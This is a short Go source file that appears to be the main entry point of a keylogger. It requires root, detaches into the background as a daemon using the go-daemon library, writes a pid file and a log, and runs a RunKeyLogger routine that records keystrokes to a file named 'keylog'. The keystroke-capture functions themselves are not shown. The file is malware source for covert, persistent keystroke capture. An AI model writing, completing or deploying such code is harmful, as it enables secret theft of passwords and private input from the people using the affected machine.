package main

import (
	"log"
	"os"

	"github.com/sevlyar/go-daemon"
)

var ctx *daemon.Context

func main() {
	err := checkRoot()
	checkErr(err)
	d, err := ctx.Reborn()
	checkErr(err)
	if d != nil {
		return
	}
	defer ctx.Release()
	log.Println(os.Getpid())
	RunKeyLogger()
}
func init() {
	ctx = &daemon.Context{
		PidFileName: "pid",
		PidFilePerm: 0755,
		LogFileName: "log",
		LogFilePerm: 0755,
		WorkDir:     "./",
		Umask:       027,
	}
	logfile = OpenFile("keylog")
}
